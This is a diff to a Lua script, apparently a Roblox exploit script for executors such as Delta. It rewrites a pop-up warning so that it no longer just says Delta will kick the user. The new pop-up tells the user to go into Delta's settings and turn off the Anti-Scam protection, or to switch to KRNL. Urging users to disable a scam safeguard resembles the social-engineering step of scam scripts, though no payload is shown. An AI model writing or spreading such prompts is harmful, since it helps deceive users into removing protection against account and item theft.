@@ -37,7 +37,7 @@ local function createWarningBox(message)
     shadow.ImageTransparency = 0.7
 
     local bigHeader = Instance.new("TextLabel", frame)
-    bigHeader.Text = "DELTA WILL KICK YOU"
+    bigHeader.Text = "⚠️ DELTA DETECTION WARNING"
     bigHeader.Size = UDim2.new(1, -40, 0, 45)
     bigHeader.Position = UDim2.new(0, 20, 0, 10)
     bigHeader.TextScaled = true
@@ -48,7 +48,7 @@ local function createWarningBox(message)
     bigHeader.TextStrokeColor3 = Color3.fromRGB(50, 0, 0)
 
     local label = Instance.new("TextLabel", frame)
-    label.Text = message
+    label.Text = "To prevent being kicked: Go to Delta > Settings > turn **Off Anti-Scam**, or use a safer executor like **KRNL**."
     label.Size = UDim2.new(1, -40, 0, 50)
     label.Position = UDim2.new(0, 20, 0, 60)
     label.TextScaled = true
@@ -86,7 +86,7 @@ local function createWarningBox(message)
 end
 
 -- SHOW WARNING FIRST
-local warningBox = createWarningBox("⚠️ WARNING: Delta Executor is detected and it will KICK you. Please switch to a safer executor like KRNL.")
+local warningBox = createWarningBox("⚠️ To prevent being kicked: Go to Delta > Settings > turn OFF Anti-Scam, or use a safer executor like KRNL.")
 
 task.delay(10, function()
     warningBox:Destroy()
